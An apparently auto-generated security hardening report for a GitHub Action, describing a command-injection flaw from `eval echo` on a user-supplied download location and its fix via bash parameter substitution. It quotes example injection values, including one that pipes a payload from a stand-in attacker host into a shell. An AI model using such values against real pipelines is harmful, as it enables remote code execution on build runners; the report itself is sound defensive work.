# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.8

> This file was generated automatically by the hardening agent.

**Policy SHA:** `ff50f15e4b79bfbf764dafdfd2579175a6ea9771`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.8** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

In the 'Download Java Validator' step, the input `inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION` is assigned to the env var `JAVA_VALIDATOR_DOWNLOAD_LOCATION` and then passed to `eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION"`. Although the value is routed through an environment variable, `eval echo` still performs shell word-splitting and command substitution on the value. An attacker who controls this input (e.g. by supplying `$(malicious_command)`) can achieve arbitrary command execution on the runner.

Locations:

- `action.yml:556`

### suspicious-run-content (severity: high)

The 'Download Java Validator' step uses eval with a $-prefixed variable — specifically `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")` — which matches the eval-dynamic pattern. The variable being eval'd is populated from the attacker-controllable input `inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION`, allowing arbitrary shell command injection via command substitution (e.g. a value like `$(curl attacker.com/payload | sh)`).

Locations:

- `action.yml:556`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Replaced `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")` with `JAVA_VALIDATOR_DOWNLOAD_LOCATION="${JAVA_VALIDATOR_DOWNLOAD_LOCATION/\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}"` in the 'Download Java Validator' step of action.yml. The `eval echo` was used to expand `$JAVA_VALIDATOR_VERSION` within the URL template string, but it allowed arbitrary command injection via the attacker-controllable `JAVA_VALIDATOR_DOWNLOAD_LOCATION` input. The fix uses bash's built-in parameter substitution to safely replace only the literal string `$JAVA_VALIDATOR_VERSION` with its value, without invoking eval or any subshell that could execute injected commands.

